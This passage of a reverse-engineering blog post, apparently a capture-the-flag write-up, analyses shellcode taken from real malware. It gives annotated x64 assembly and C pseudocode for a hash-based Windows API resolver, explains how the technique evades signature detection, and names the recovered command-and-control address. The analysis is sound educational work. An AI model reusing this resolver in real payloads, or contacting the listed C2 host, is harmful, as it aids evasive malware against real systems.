+</span></span><span style="display:flex;"><span>ror     r9d, <span style="color:#ae81ff">0</span>Dh                 ; Rotate hash right by <span style="color:#ae81ff">13</span> bits
+</span></span><span style="display:flex;"><span>add     r9d, eax                 ; Add character to hash
+</span></span><span style="display:flex;"><span>loop    loc_2D                   ; Continue until RCX (string length) reaches <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Process DLL<span style="color:#e6db74">&#39;s export table</span>
+</span></span><span style="display:flex;"><span>push    rdx                      ; Save current LDR_DATA_TABLE_ENTRY pointer
+</span></span><span style="display:flex;"><span>mov     rdx, [rdx<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h]           ; Access DllBase from LDR_DATA_TABLE_ENTRY
+</span></span><span style="display:flex;"><span>push    r9                       ; Save DLL name hash
+</span></span><span style="display:flex;"><span>mov     eax, [rdx<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>Ch]           ; Read IMAGE_DOS_HEADER<span style="color:#f92672">.</span>e_lfanew
+</span></span><span style="display:flex;"><span>add     rax, rdx                 ; Calculate NT headers address
+</span></span><span style="display:flex;"><span>cmp     word ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h], <span style="color:#ae81ff">20</span>Bh ; Check IMAGE_OPTIONAL_HEADER64<span style="color:#f92672">.</span>Magic (<span style="color:#ae81ff">0x020B</span>)
+</span></span><span style="display:flex;"><span>jnz     loc_CB                   ; Skip <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit PE
+</span></span><span style="display:flex;"><span>mov     eax, [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">88</span>h]           ; Read DataDirectory[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>VirtualAddress (<span style="color:#66d9ef">export</span> table RVA)
+</span></span><span style="display:flex;"><span>test    rax, rax
+</span></span><span style="display:flex;"><span>jz      short loc_CB             ; Skip <span style="color:#66d9ef">if</span> no <span style="color:#66d9ef">export</span> table
+</span></span><span style="display:flex;"><span>add     rax, rdx                 ; Calculate <span style="color:#66d9ef">export</span> table virtual address
+</span></span><span style="display:flex;"><span>mov     r8d, [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h]           ; Read IMAGE_EXPORT_DIRECTORY<span style="color:#f92672">.</span>AddressOfNames
+</span></span><span style="display:flex;"><span>mov     ecx, [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]           ; Read IMAGE_EXPORT_DIRECTORY<span style="color:#f92672">.</span>NumberOfNames
+</span></span><span style="display:flex;"><span>add     r8, rdx                  ; Calculate AddressOfNames virtual address
+</span></span><span style="display:flex;"><span>push    rax                      ; Save <span style="color:#66d9ef">export</span> directory pointer
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Function name enumeration loop
+</span></span><span style="display:flex;"><span>loc_72:
+</span></span><span style="display:flex;"><span>jrcxz   loc_CA                   ; Exit <span style="color:#66d9ef">if</span> no more names to check
+</span></span><span style="display:flex;"><span>xor     r9, r9                   ; Reset hash accumulator
+</span></span><span style="display:flex;"><span>dec     rcx                      ; Decrement name counter (use as index)
+</span></span><span style="display:flex;"><span>mov     esi, [r8<span style="color:#f92672">+</span>rcx<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>]          ; Read function name RVA from AddressOfNames array
+</span></span><span style="display:flex;"><span>add     rsi, rdx                 ; Calculate function name virtual address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Function name hashing loop
+</span></span><span style="display:flex;"><span>loc_81:
+</span></span><span style="display:flex;"><span>xor     rax, rax                 ; Clear RAX
+</span></span><span style="display:flex;"><span>lodsb                            ; Load next character from function name
+</span></span><span style="display:flex;"><span>ror     r9d, <span style="color:#ae81ff">0</span>Dh                 ; Rotate hash right by <span style="color:#ae81ff">13</span> bits
+</span></span><span style="display:flex;"><span>add     r9d, eax                 ; Add character to hash
+</span></span><span style="display:flex;"><span>cmp     al, ah                   ; Check <span style="color:#66d9ef">if</span> character is NULL (AH is <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>jnz     short loc_81             ; Continue <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> end of string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Hash comparison <span style="color:#f92672">and</span> function resolution
+</span></span><span style="display:flex;"><span>add     r9, [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]              ; Add DLL name hash to function name hash
+</span></span><span style="display:flex;"><span>cmp     r9d, r10d                ; Compare with target hash (passed <span style="color:#f92672">in</span> R10)
+</span></span><span style="display:flex;"><span>jnz     short loc_72             ; Continue searching <span style="color:#66d9ef">if</span> no match
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Function found <span style="color:#f92672">-</span> resolve address
+</span></span><span style="display:flex;"><span>pop     rax                      ; Restore <span style="color:#66d9ef">export</span> directory pointer
+</span></span><span style="display:flex;"><span>mov     r8d, [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>h]           ; Read IMAGE_EXPORT_DIRECTORY<span style="color:#f92672">.</span>AddressOfNameOrdinals
+</span></span><span style="display:flex;"><span>add     r8, rdx                  ; Calculate AddressOfNameOrdinals virtual address
+</span></span><span style="display:flex;"><span>mov     cx, [r8<span style="color:#f92672">+</span>rcx<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]           ; Read ordinal from AddressOfNameOrdinals array
+</span></span><span style="display:flex;"><span>mov     r8d, [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>Ch]           ; Read IMAGE_EXPORT_DIRECTORY<span style="color:#f92672">.</span>AddressOfFunctions
+</span></span><span style="display:flex;"><span>add     r8, rdx                  ; Calculate AddressOfFunctions virtual address
+</span></span><span style="display:flex;"><span>mov     eax, [r8<span style="color:#f92672">+</span>rcx<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>]          ; Read function RVA using ordinal as index
+</span></span><span style="display:flex;"><span>add     rax, rdx                 ; Calculate final function address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Cleanup <span style="color:#f92672">and</span> <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>pop     r8                       ; Restore registers
+</span></span><span style="display:flex;"><span>pop     r8
+</span></span><span style="display:flex;"><span>pop     rsi
+</span></span><span style="display:flex;"><span>pop     rcx
+</span></span><span style="display:flex;"><span>pop     rdx
+</span></span><span style="display:flex;"><span>pop     r8
+</span></span><span style="display:flex;"><span>pop     r9
+</span></span><span style="display:flex;"><span>pop     r10                      ; Pop <span style="color:#66d9ef">return</span> address
+</span></span><span style="display:flex;"><span>sub     rsp, <span style="color:#ae81ff">20</span>h                 ; Allocate shadow space <span style="color:#66d9ef">for</span> function call
+</span></span><span style="display:flex;"><span>push    r10                      ; Restore <span style="color:#66d9ef">return</span> address
+</span></span><span style="display:flex;"><span>jmp     rax                      ; Jump to resolved function
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Continue to next DLL <span style="color:#66d9ef">if</span> function <span style="color:#f92672">not</span> found
+</span></span><span style="display:flex;"><span>loc_CA:
+</span></span><span style="display:flex;"><span>pop     rax                      ; Clean up <span style="color:#66d9ef">export</span> directory pointer
+</span></span><span style="display:flex;"><span>loc_CB:
+</span></span><span style="display:flex;"><span>pop     r9                       ; Restore DLL name hash
+</span></span><span style="display:flex;"><span>pop     rdx                      ; Restore LDR_DATA_TABLE_ENTRY pointer
+</span></span><span style="display:flex;"><span>mov     rdx, [rdx]               ; Move to next entry (InMemoryOrderLinks<span style="color:#f92672">.</span>Flink)
+</span></span><span style="display:flex;"><span>jmp     loc_21                   ; Continue with next DLL</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><h3 id="how-the-algorithm-works" class="mt-6 mb-2 text-lg sm:text-xl text-white">
+    <span class="relative inline-block">
+      How the Algorithm Works
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h3>
+<p>The API resolution routine implements a sophisticated hash-based function lookup that operates in several phases:</p>
+<p><strong>Phase 1: DLL Enumeration</strong>
+The routine begins by accessing the <strong>Process Environment Block (PEB)</strong> through the <code>gs:[0x60]</code> segment register. The PEB contains the <code>PEB_LDR_DATA</code> structure, which maintains linked lists of all loaded modules in the process. The shellcode walks the <code>InMemoryOrderModuleList</code> to enumerate each loaded DLL.</p>
+<p><strong>Phase 2: DLL Name Hashing</strong>
+For each DLL, the routine extracts the <code>BaseDllName</code> from the <code>LDR_DATA_TABLE_ENTRY</code> structure. It then applies a custom hashing algorithm:</p>
+<ul>
+<li>Each character is converted to uppercase if it&rsquo;s lowercase</li>
+<li>The hash is rotated right by 13 bits</li>
+<li>The character value is added to the hash</li>
+</ul>
+<p>This produces a unique 32-bit hash for each DLL name (e.g., &ldquo;KERNEL32.DLL&rdquo;, &ldquo;NTDLL.DLL&rdquo;).</p>
+<p><strong>Phase 3: Export Table Processing</strong>
+For each DLL, the routine locates the PE export table by:</p>
+<ul>
+<li>Reading the <code>e_lfanew</code> field from the DOS header to find the NT headers</li>
+<li>Verifying the PE magic number (0x020B for 64-bit)</li>
+<li>Extracting the export directory from the data directories array</li>
+</ul>
+<p><strong>Phase 4: Function Name Hashing</strong>
+The routine iterates through all exported function names using the <code>AddressOfNames</code> array. For each function name, it applies the same hashing algorithm used for DLL names.</p>
+<p><strong>Phase 5: Combined Hash Matching</strong>
+The final hash is calculated by adding the DLL name hash to the function name hash. This combined hash is compared against the target hash passed in the <code>r10</code> register.</p>
+<p><strong>Phase 6: Function Address Resolution</strong>
+When a match is found, the routine uses the function&rsquo;s index to:</p>
+<ul>
+<li>Look up the ordinal in the <code>AddressOfNameOrdinals</code> array</li>
+<li>Use the ordinal to index into the <code>AddressOfFunctions</code> array</li>
+<li>Calculate the final virtual address of the function</li>
+</ul>
+<h3 id="pseudocode-implementation" class="mt-6 mb-2 text-lg sm:text-xl text-white">
+    <span class="relative inline-block">
+      Pseudocode Implementation
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h3>
+<p>Here&rsquo;s a C-style pseudocode representation of the algorithm:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">c</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PVOID <span style="color:#a6e22e">resolve_api_by_hash</span>(DWORD target_hash) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Access PEB and get first loaded module
+</span></span></span><span style="display:flex;"><span>    PPEB peb <span style="color:#f92672">=</span> (PPEB)<span style="color:#a6e22e">__readgsqword</span>(<span style="color:#ae81ff">0x60</span>);
+</span></span><span style="display:flex;"><span>    PLDR_DATA_TABLE_ENTRY module <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)
+</span></span><span style="display:flex;"><span>        peb<span style="color:#f92672">-&gt;</span>LoaderData<span style="color:#f92672">-&gt;</span>InMemoryOrderModuleList.Flink;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Iterate through all loaded modules
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (module) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Calculate DLL name hash
+</span></span></span><span style="display:flex;"><span>        DWORD dll_hash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        PWCHAR dll_name <span style="color:#f92672">=</span> module<span style="color:#f92672">-&gt;</span>BaseDllName.Buffer;
+</span></span><span style="display:flex;"><span>        USHORT name_len <span style="color:#f92672">=</span> module<span style="color:#f92672">-&gt;</span>BaseDllName.MaximumLength <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (USHORT i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> name_len; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            WCHAR c <span style="color:#f92672">=</span> dll_name[i];
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">&gt;=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">&amp;&amp;</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;z&#39;</span>) c <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x20</span>;  <span style="color:#75715e">// Convert to uppercase
+</span></span></span><span style="display:flex;"><span>            dll_hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">_rotr</span>(dll_hash, <span style="color:#ae81ff">13</span>) <span style="color:#f92672">+</span> c;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Access export table
+</span></span></span><span style="display:flex;"><span>        PIMAGE_DOS_HEADER dos_header <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)module<span style="color:#f92672">-&gt;</span>DllBase;
+</span></span><span style="display:flex;"><span>        PIMAGE_NT_HEADERS64 nt_headers <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS64)
+</span></span><span style="display:flex;"><span>            ((PBYTE)module<span style="color:#f92672">-&gt;</span>DllBase <span style="color:#f92672">+</span> dos_header<span style="color:#f92672">-&gt;</span>e_lfanew);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (nt_headers<span style="color:#f92672">-&gt;</span>OptionalHeader.Magic <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x020B</span>) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        PIMAGE_EXPORT_DIRECTORY export_dir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)
+</span></span><span style="display:flex;"><span>            ((PBYTE)module<span style="color:#f92672">-&gt;</span>DllBase <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>             nt_headers<span style="color:#f92672">-&gt;</span>OptionalHeader.DataDirectory[<span style="color:#ae81ff">0</span>].VirtualAddress);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>export_dir) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Iterate through exported functions
+</span></span></span><span style="display:flex;"><span>        PDWORD name_rvas <span style="color:#f92672">=</span> (PDWORD)((PBYTE)module<span style="color:#f92672">-&gt;</span>DllBase <span style="color:#f92672">+</span> export_dir<span style="color:#f92672">-&gt;</span>AddressOfNames);
+</span></span><span style="display:flex;"><span>        PWORD ordinals <span style="color:#f92672">=</span> (PWORD)((PBYTE)module<span style="color:#f92672">-&gt;</span>DllBase <span style="color:#f92672">+</span> export_dir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
+</span></span><span style="display:flex;"><span>        PDWORD func_rvas <span style="color:#f92672">=</span> (PDWORD)((PBYTE)module<span style="color:#f92672">-&gt;</span>DllBase <span style="color:#f92672">+</span> export_dir<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> export_dir<span style="color:#f92672">-&gt;</span>NumberOfNames; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Calculate function name hash
+</span></span></span><span style="display:flex;"><span>            DWORD func_hash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            PCHAR func_name <span style="color:#f92672">=</span> (PCHAR)((PBYTE)module<span style="color:#f92672">-&gt;</span>DllBase <span style="color:#f92672">+</span> name_rvas[i]);
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>func_name) {
+</span></span><span style="display:flex;"><span>                func_hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">_rotr</span>(func_hash, <span style="color:#ae81ff">13</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>func_name<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Check combined hash
+</span></span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ((dll_hash <span style="color:#f92672">+</span> func_hash) <span style="color:#f92672">==</span> target_hash) {
+</span></span><span style="display:flex;"><span>                WORD ordinal <span style="color:#f92672">=</span> ordinals[i];
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> (PVOID)((PBYTE)module<span style="color:#f92672">-&gt;</span>DllBase <span style="color:#f92672">+</span> func_rvas[ordinal]);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Move to next module
+</span></span></span><span style="display:flex;"><span>        module <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)module<span style="color:#f92672">-&gt;</span>InMemoryOrderLinks.Flink;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;  <span style="color:#75715e">// Function not found
+</span></span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>This hash-based API resolution technique is particularly effective for malware because:</p>
+<ul>
+<li>It avoids static import tables that signature-based detection might flag</li>
+<li>The hash values provide no obvious indication of which functions are being resolved</li>
+<li>It can resolve functions from any loaded DLL, not just those in the import table</li>
+<li>The custom hashing algorithm makes it difficult for analysts to pre-compute hash dictionaries</li>
+</ul>
+<h2 id="conclusion" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      Conclusion
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>This challenge stood out as a rewarding reverse engineering exercise. While I managed to extract the flag (the C2 server address <code>81.91.19.18:443</code>) within an hour during the live competition, the true value of this challenge extended far beyond the initial solve.</p>
+<p>What made this challenge particularly compelling was its use of actual malicious code. This provided an authentic experience of analyzing real-world malware techniques.</p>
+<p>The challenge kept me engaged for several days after the competition ended, diving deep into every aspect of the shellcode&rsquo;s functionality, and writing this blog post. This extended analysis helped me approach Windows internals and expand my knowledge.</p>
+<h3 id="useful-resources" class="mt-6 mb-2 text-lg sm:text-xl text-white">
+    <span class="relative inline-block">
+      Useful Resources
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h3>
+<p>During the analysis, I found several resources particularly valuable for understanding the underlying Windows structures and concepts:</p>
+<ul>
+<li>
+<p><strong>Process Environment Block (PEB) Analysis</strong>: Metehan Bulut&rsquo;s blog post &ldquo;<a href="https://metehan-bulut.medium.com/understanding-the-process-environment-block-peb-for-malware-analysis-26315453793f#e4f2">Understanding the Process Environment Block (PEB) for Malware Analysis</a>&rdquo; provided an excellent introduction into PEB structure and its role in malware analysis.</p>
+</li>
+<li>
+<p><strong>Windows Kernel Structures</strong>: The <a href="https://www.vergiliusproject.com/">Vergilius Project</a> for accessing detailed definitions of undocumented Windows kernel structures across different OS versions, particularly for understanding the precise layout of <code>LDR_DATA_TABLE_ENTRY</code> and related structures.</p>
+</li>
+</ul>
+
+      </div>
+    </div>
+  </article>
+</div>
+
+<style>
+  .toc {
+    font-size: 0.95rem;
+    line-height: 1.35;
+  }
+
+  .toc ul {
+    list-style: none;
+    margin: 0;
+    padding-left: 0;
+  }
+
+  .toc li {
+    position: relative;
+    margin: 0.35rem 0;
+    padding-left: 1.25rem;
+     
+    overflow-wrap: anywhere;
+     
+    word-break: break-word;
+  }
+
+  .toc a {
+    display: block;
+     
+    padding: 0.15rem 0;
+    color: rgba(209, 213, 219, 0.92);
+    text-decoration: none;
+  }
+
+  .toc a:hover {
+    color: #fff;
+    text-decoration: underline;
+    text-decoration-color: rgba(99, 102, 241, 0.85);
+    text-underline-offset: 3px;
+  }
+
+   
+  .toc ul ul {
+    margin: 0.4rem 0 0.4rem 0.35rem;
+    padding-left: 0.9rem;
+    border-left: 1px solid rgba(55, 65, 81, 0.6);
+  }
+
+  .toc ul ul>li {
+    padding-left: 1.75rem;
+  }
+
+   
+  .toc ul ul>li::before {
+    content: "├";
+    position: absolute;
+    left: 0.35rem;
+    top: 0.2rem;
+     
+    color: rgba(99, 102, 241, 0.75);
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+  }
+
+  .toc ul ul>li:last-child::before {
+    content: "└";
+  }
+
+   
+  @media (min-width: 1024px) {
+    .toc {
+      max-height: calc(100vh - 9rem);
+      overflow: auto;
+      padding-right: 0.25rem;
+    }
+  }
+
+
+   
+  .md-content ul,
+  .md-content ol {
+    margin: 1rem 0;
+    padding-left: 1.35rem;
+  }
+
+  .md-content ul {
+    list-style: disc;
+  }
+
+  .md-content ul ul {
+    list-style: circle;
+  }
+
+  .md-content ul ul ul {
+    list-style: square;
+  }
+
+  .md-content ol {
+    list-style: decimal;
+  }
+
+  .md-content ol ol {
+    list-style: lower-roman;
+  }
+
+  .md-content ol ol ol {
+    list-style: lower-alpha;
+  }
+
+  .md-content li {
+    margin: 0.35rem 0;
+  }
+
+   
+  .md-content pre,
+  .md-content code {
+    tab-size: 4;
+  }
+</style>
+
+      </div>
+
+    </div>
+  </main>
+
+  <footer>
+    <div class="border-t border-gray-800 bg-[#070709] text-gray-400">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6">
+    <div class="flex flex-col md:flex-row items-center justify-between py-6 space-y-4 md:space-y-0">
+
+      
+      <div class="text-sm sm:text-base md:text-lg">
+        <span class="relative inline-block">
+          © 2026 Luca Palumbo. All rights reserved. <br>
+          Made with <a href="https://gohugo.io" target="_blank">Hugo</a> | <a
+            href="https://github.com/Enerhim/enervoid-theme" target="_blank">Enervoid</a>
+        </span>
+      </div>
+
+      
+      <div class="flex items-center space-x-6 text-sm sm:text-base md:text-lg">
+
+        
+        <a href='https://github.com/LucaPalumbo' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-github-original"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+        <a href='https://twitter.com/Luca_Palumbo_' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-twitter-original"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+        <a href='https://linkedin.com/in/luca-palumbo-b9baa020a' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-linkedin-plain"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+
+      </div>
+    </div>
+  </div>
+</div>
+
+  </footer>
+</body>
+
+</html>
